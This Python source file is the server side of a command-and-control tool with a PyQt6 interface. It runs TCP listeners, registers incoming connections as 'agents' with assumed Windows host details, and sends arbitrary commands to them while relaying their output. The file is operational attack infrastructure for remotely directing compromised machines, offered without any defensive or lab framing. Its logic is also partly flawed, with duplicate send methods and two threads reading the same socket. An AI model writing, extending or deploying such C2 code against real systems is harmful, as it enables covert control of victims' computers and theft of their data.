
import socket
import threading
import json
import time
from PyQt6.QtCore import QObject, pyqtSignal

class C2Server(QObject):
    agent_connected = pyqtSignal(dict)
    listener_started = pyqtSignal(dict)
    agent_disconnected = pyqtSignal(str)
    command_response = pyqtSignal(str, str, str)  # agent_id, command, response

    def __init__(self):
        super().__init__()
        self.listeners = {}
        self.threads = {}
        self.agents = {}  # Store active agent connections
        self.next_agent_id = 1
        self.running = True
        
    def send_command_to_agent(self, agent_id, command):
        """Send command to specific agent"""
        if agent_id not in self.agents:
            print(f"Agent {agent_id} not found in {list(self.agents.keys())}")
            self.command_response.emit(agent_id, command, f"Error: Agent {agent_id} not found")
            return False
        
        try:
            agent_data = self.agents[agent_id]
            agent_socket = agent_data['socket']  # Access socket from nested structure
            
            # Check if socket is still valid
            if not agent_socket or agent_socket.fileno() == -1:
                print(f"Agent {agent_id} socket is closed")
                self.command_response.emit(agent_id, command, "Error: Agent connection lost")
                # Remove dead agent
                del self.agents[agent_id]
                self.agent_disconnected.emit(agent_id)
                return False
            
            # Send command with newline delimiter
            message = command.encode('utf-8') + b'\n'
            agent_socket.send(message)
            print(f"✅ Command sent to {agent_id}: {command}")
            
            # Wait for response with timeout
            agent_socket.settimeout(10)  # Reduced timeout
            response = agent_socket.recv(8192).decode('utf-8', errors='ignore').strip()
            
            # Emit response signal
            self.command_response.emit(agent_id, command, response)
            
            print(f"✅ Response received from {agent_id}: {response[:100]}...")
            
            return True
            
        except socket.timeout:
            error_msg = f"Timeout waiting for response from {agent_id}"
            print(error_msg)
            self.command_response.emit(agent_id, command, error_msg)
            return False
        except Exception as e:
            error_msg = f"Error: {str(e)}"
            print(f"Error sending command to {agent_id}: {e}")
            self.command_response.emit(agent_id, command, error_msg)
            return False

    def start_listener(self, config):
        """Start a new listener with comprehensive error handling"""
        if config['name'] in self.listeners:
            print(f"Listener {config['name']} already running.")
            return False

        try:
            # Validate configuration
            if not self._validate_listener_config(config):
                print(f"Invalid listener configuration: {config}")
                return False
                
            listener_thread = threading.Thread(target=self._listen, args=(config,))
            listener_thread.daemon = True
            listener_thread.start()
            
            self.threads[config['name']] = listener_thread
            self.listeners[config['name']] = config
            self.listener_started.emit(config)
            print(f"Started listener '{config['name']}' on {config['host']}:{config['port']}")
            return True
            
        except PermissionError:
            print(f"Permission denied: Cannot bind to {config['host']}:{config['port']}")
            return False
        except OSError as e:
            if e.errno == 98:  # Address already in use
                print(f"Port {config['port']} is already in use")
            else:
                print(f"OS error starting listener '{config['name']}': {e}")
            return False
        except Exception as e:
            print(f"Unexpected error starting listener '{config['name']}': {e}")
            return False
    
    def _validate_listener_config(self, config):
        """Validate listener configuration"""
        try:
            required_fields = ['name', 'host', 'port', 'type']
            for field in required_fields:
                if field not in config:
                    return False
            
            # Validate port
            port = int(config['port'])
            if not (1 <= port <= 65535):
                return False
                
            # Validate host
            if not config['host']:
                return False
                
            return True
        except (ValueError, TypeError):
            return False

    def _listen(self, config):
        """Listen for incoming connections with robust error handling"""
        server_socket = None
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind with retry mechanism
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    server_socket.bind((config['host'], config['port']))
                    break
                except OSError as e:
                    if attempt == max_retries - 1:
                        raise
                    print(f"Bind attempt {attempt + 1} failed: {e}, retrying...")
                    time.sleep(1)
            
            server_socket.listen(10)
            server_socket.settimeout(1.0)  # Non-blocking with timeout
            
            print(f"Listener '{config['name']}' bound to {config['host']}:{config['port']}")

            while self.running and config['name'] in self.listeners:
                try:
                    client_socket, addr = server_socket.accept()
                    print(f"Accepted connection from {addr}")
                    
                    # Handle each agent in a separate thread with error isolation
                    try:
                        agent_thread = threading.Thread(
                            target=self._handle_agent_safe, 
                            args=(client_socket, addr, config),
                            daemon=True
                        )
                        agent_thread.start()
                    except Exception as e:
                        print(f"Failed to create agent handler thread: {e}")
                        try:
                            client_socket.close()
                        except:
                            pass
                    
                except socket.timeout:
                    continue
                except ConnectionAbortedError:
                    if self.running:
                        print(f"Connection aborted in listener '{config['name']}'")
                    break
                except OSError as e:
                    if self.running:
                        print(f"Socket error in listener '{config['name']}': {e}")
                    break
                except Exception as e:
                    if self.running:
                        print(f"Unexpected error in listener '{config['name']}': {e}")
                    break
                    
        except PermissionError:
            print(f"Permission error: Cannot bind to {config['host']}:{config['port']}")
        except OSError as e:
            if e.errno == 98:
                print(f"Address already in use: {config['host']}:{config['port']}")
            else:
                print(f"OS error in listener '{config['name']}': {e}")
        except Exception as e:
            print(f"Critical error in listener '{config['name']}': {e}")
        finally:
            if server_socket:
                try:
                    server_socket.close()
                except Exception as e:
                    print(f"Error closing server socket: {e}")
            
            # Clean up listener from registry
            if config['name'] in self.listeners:
                del self.listeners[config['name']]
            if config['name'] in self.threads:
                del self.threads[config['name']]
                
            print(f"Listener '{config['name']}' stopped")
    
    def _handle_agent_safe(self, client_socket, addr, config):
        """Safe wrapper for agent handling with comprehensive error handling"""
        try:
            self._handle_agent(client_socket, addr, config)
        except Exception as e:
            print(f"Error handling agent from {addr}: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass

    def _handle_agent(self, client_socket, addr, listener_config):
        agent_id = f"agent_{self.next_agent_id:03d}"
        self.next_agent_id += 1
        
        try:
            # Set socket timeout for better stability
            client_socket.settimeout(30.0)
            
            # Perform handshake to get agent information
            agent_info = self._perform_handshake(client_socket, agent_id, addr, listener_config)
            
            if agent_info:
                # Store agent connection
                self.agents[agent_id] = {
                    'socket': client_socket,
                    'info': agent_info,
                    'last_heartbeat': time.time()
                }
                
                print(f"✅ Agent {agent_id} stored in agents list. Total agents: {len(self.agents)}")
                
                # Emit agent connected signal
                self.agent_connected.emit(agent_info)
                
                # Start heartbeat monitoring - this will block until agent disconnects
                self._monitor_agent(agent_id, client_socket)
            
        except Exception as e:
            print(f"Error handling agent {agent_id} from {addr}: {e}")
            # Only clean up on error
            if agent_id in self.agents:
                del self.agents[agent_id]
                self.agent_disconnected.emit(agent_id)
            try:
                client_socket.close()
            except:
                pass

    def _perform_handshake(self, client_socket, agent_id, addr, listener_config):
        """Perform initial handshake with agent"""
        try:
            # For simple agents, just gather basic info without complex handshake
            # Don't send commands during handshake - let agent work first
            
            hostname = f"Agent_{addr[0].replace('.', '_')}"
            user = "Unknown"
            arch = "x64"
            
            agent_info = {
                "id": agent_id,
                "hostname": hostname,
                "user": user,
                "external_ip": addr[0],
                "internal_ip": addr[0],
                "domain": "WORKGROUP",
                "process": "unknown.exe",
                "pid": "0",
                "os": "Windows",
                "arch": arch,
                "listener": listener_config['name'],
                "last_seen": time.strftime("%H:%M:%S"),
                "socket": client_socket,
                "address": addr[0],
                "port": addr[1]
            }
            
            return agent_info
            
        except Exception as e:
            print(f"Handshake failed for agent {agent_id}: {e}")
            return None

    def _monitor_agent(self, agent_id, client_socket):
        """Monitor agent connection and handle commands"""
        print(f"📡 Starting monitoring for agent {agent_id}")
        
        try:
            while self.running and agent_id in self.agents:
                try:
                    # Update heartbeat
                    if agent_id in self.agents:
                        self.agents[agent_id]['last_heartbeat'] = time.time()
                    
                    # Check for incoming data (non-blocking)
                    client_socket.settimeout(1.0)
                    try:
                        data = client_socket.recv(4096)
                        if not data:  # Connection closed
                            print(f"📡 Agent {agent_id} connection closed")
                            break
                        
                        response = data.decode('utf-8', errors='ignore').strip()
                        if response:
                            print(f"📡 Received data from {agent_id}: {response[:50]}...")
                            # This might be a response to a command, but we don't emit here
                            # Commands responses are handled in send_command_to_agent
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"📡 Socket error for {agent_id}: {e}")
                        break
                        
                    time.sleep(0.1)  # Small delay to prevent CPU spinning
                    
                except Exception as e:
                    print(f"Monitor error for agent {agent_id}: {e}")
                    break
                    
        except Exception as e:
            print(f"Agent monitoring failed for {agent_id}: {e}")
        finally:
            # Cleanup when monitoring ends
            print(f"📡 Stopping monitoring for agent {agent_id}")
            if agent_id in self.agents:
                del self.agents[agent_id]
                self.agent_disconnected.emit(agent_id)
            try:
                client_socket.close()
            except:
                pass

    def send_command(self, agent_id, command):
        """Send command to specific agent"""
        if agent_id not in self.agents:
            return False
            
        try:
            client_socket = self.agents[agent_id]['socket']
            command_data = f"{command}\n".encode('utf-8')
            client_socket.send(command_data)
            return True
        except Exception as e:
            print(f"Failed to send command to {agent_id}: {e}")
            # Remove failed agent
            if agent_id in self.agents:
                del self.agents[agent_id]
                self.agent_disconnected.emit(agent_id)
            return False

    def disconnect_agent(self, agent_id):
        """Disconnect specific agent"""
        if agent_id in self.agents:
            try:
                self.agents[agent_id]['socket'].close()
            except:
                pass
            del self.agents[agent_id]
            self.agent_disconnected.emit(agent_id)

    def stop_listener(self, listener_name):
        """Stop specific listener"""
        if listener_name in self.listeners:
            del self.listeners[listener_name]
            return True
        return False

    def stop_all(self):
        """Stop all listeners and disconnect all agents"""
        self.running = False
        
        # Disconnect all agents
        for agent_id in list(self.agents.keys()):
            self.disconnect_agent(agent_id)
        
        # Clear listeners
        self.listeners.clear()
        self.threads.clear()
